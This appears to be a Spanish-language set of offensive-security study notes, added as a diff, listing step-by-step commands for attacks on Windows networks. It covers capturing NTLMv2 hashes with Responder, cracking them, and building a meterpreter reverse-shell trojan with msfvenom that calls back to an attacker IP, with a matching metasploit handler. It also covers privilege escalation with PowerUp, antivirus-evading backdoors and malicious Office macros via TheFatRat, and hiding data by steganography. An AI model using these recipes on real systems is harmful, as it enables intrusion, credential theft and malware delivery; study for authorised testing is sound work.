@@ -1,0 +1,85 @@
+1. Obtener hashes NTLMv2 envenenando el tráfico con Responder.py
+-----------------------------------------------------------------
+Ejecutar Responder.py
+> ./Responder.py -I <interfaz>
+
+2. Crackear hashes con L0phtCrack
+---------------------------------
+- Proceed With Trial.
+- Password Auditing Wizard.
+- Pulsamos Next.
+- Elegimos el sistema objetivo: Windows / UNIX
+- Elegimnos una de las opciones en función de donde tengamos el fichero:
+  - Local machine.
+  - Remote machine.
+  - Fichero generado por PWDump.
+- Elegimos el tipo de Auditoria:
+  - Quick Password Audit: Utiliza un diccionario con algunas permutaciones.
+  - Common Password Audit: Utiliza un diccionario con algunas permutaciones, seguida de una hora de pruebas de fuerza bruta.
+  - Through Password Audit:  Utiliza un diccionario con algunas permutaciones, seguida de seis hora de pruebas de fuerza bruta.
+
+3. Crear un troyano con msfvenom y un handler en metasploit
+-----------------------------------------------------------
+Crear el troyano:
+> msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=<IP-ATACANTE> LPORT=<PUERTO-ATACANTE> -o ruta_fichero
+
+Poner a la escucha en metasploit:
+> msfconsole
+> use exploit/multi/handler
+> set payload windows/meterpreter/reverse_tcp
+> set LHOST <IP-ATACANTE>
+> set LPORT <PUERTO-ATACANTE>
+> run
+
+Elevar privilegios con PowerUp.ps1
+meterpreter> upload ruta/PoerUp.ps1
+meterpreter> shell
+C:\>  powershell -ExecutionPolicy Bypass -Command “. .\PowerUp.ps1;Invoke-AllChecks” 
+
+4. Crear un troyano con TheFatRat
+----------------------------------------------------
+Damos perminos de ejecución a los siguientes archivos:
+> chmod +x fatrat 
+> chmod +x ./setup.sh 
+> chmod +x ./powerfull.sh
+
+Ejecutamos el script setup.sh para comenzar la instalación:
+> ./setup.sh
+
+Seleccionamos la opción 2 y después indicamos y.
+
+Ejecutamos la aplicación con el siguiente comando:
+> fatrat
+
+Elegimos la opción 6 -> Create Fud Backdoor 1000% with PwnWinds [Excelent] 
+
+Elegimos la opción 3 -> Create exe file with apache + Powershell (FUD 100%) 
+
+Indicamos los siguientes datos: LHOST, LPORT and payload
+
+Elegimos el payload 3 -> windows/meterpreter/reverse_tcp
+
+4.1 Crear un documento Office malicioso con TheFatRat
+-----------------------------------------------------
+Elegimos la opción 7 -> Create Backdoor For Office with Microsploit
+Elegimos la opción 2 -> The Microsoft Office Macro on Windows 
+Indicamos los siguientes datos: LHOST, LPORT y nombre del fichero.
+
+5. Esteganografía con SNOW
+------------------------
+Para esconder información utilizamos el siguiente comando:
+> snow -C -m "<secreto>" - p "<password>" >fichero_original> <fichero_final>
+
+Para comprobar la información escondida en un fichero:
+> snow -C -p "<password>" <fichero_con_secreto>
+
+6. Esteganografía con OpenStego
+-------------------------------
+Para extraer la información selecionamos el fichero que creemos que esconde algo.
+Escogemos el fichero en el que se van a guardar los resultados.
+Indicamos la password del fichero.
+Le damos a Extract Data.
+
+
+
+
